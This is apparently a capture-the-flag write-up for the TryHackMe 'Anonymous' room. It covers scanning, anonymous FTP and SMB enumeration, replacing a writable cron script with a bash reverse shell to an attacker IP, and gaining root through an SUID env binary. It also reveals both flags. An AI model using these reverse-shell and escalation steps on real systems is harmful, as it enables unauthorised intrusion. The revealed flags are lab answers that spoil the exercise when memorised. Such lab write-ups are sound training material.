# Room: [Anonymous](https://tryhackme.com/room/anonymous) (*Not the hacking group*) :wink:


## Basic Enum

Nmap / rustcan

```shell
IP=VICTIM
rustscan -a $IP | tee rustscan.log
[...]
PORT    STATE SERVICE      REASON
21/tcp  open  ftp          syn-ack ttl 63
22/tcp  open  ssh          syn-ack ttl 63
139/tcp open  netbios-ssn  syn-ack ttl 63
445/tcp open  microsoft-ds syn-ack ttl 63

```

- Enumerate the machine.  How many ports are open?
**4**

- What service is running on port 21?
**ftp**

- What service is running on ports 139 and 445?
**smb**

```shell
smbclient -L $IP (without any password)

Enter WORKGROUP\root's password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	pics            Disk      My SMB Share Directory for Pics
	IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

```

- There's a share on the user's computer. What's it called?
**pics**

> HINT: What's that log file doing there?... nc won't work the way you'd expect it to

```shell
ftp $IP

Name: anonymous
Password: (without any password)
ftp> ls
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
ftp> cd scripts
ftp> ls
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1376 Mar 05 22:23 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.

ftp> mget *
```
Let's cat each files: 

```shell
cat clean.sh 
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

```shell
cat removed_files.log 
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
```

```shell
cat to_do.txt        
I really need to disable the anonymous login...it's really not safe
```

## Basic shell

So let's have fun by uploading this reverse shell via ftp now:

```shell
cat clean.sh

#!/bin/bash
bash -i >& /dev/tcp/<AttackerIp>/4242 0>&1
```

And after few seconds we are in :

```shell
rlwrap nc -nlvp 4242
listening on [any] 4242
namelessone@anonymous:~$ 
id
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
ls
pics  user.txt
cat user.txt
90d6f992585815ff991e68748c414740
namelessone@anonymous:~$ 

```

- usert.txt: **90d6f992585815ff991e68748c414740**

> HINT: This may require you to do some outside research

Cool ! So as usual in this case, [gtfobins](https://gtfobins.github.io/) comes in :point_left:

```shell
find / -perm -u=s 2>/dev/null
[...]
/usr/bin/env
```

So let's try this: [gtfobins break out from restricted environments](https://gtfobins.github.io/gtfobins/env/#shell)

```shell
env /bin/bash -p
bash-4.4# id
uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
cat /root/root.txt
4d9<Redacted>363
bash-4.4# 

```

Houra :partying_face:

<details>
  <summary>Click to reveal the root flag!</summary>
  
  ```bash
  cat /root/root.txt
  4d930091c31a622a7ed10f27999af363
  ```
</details>
 
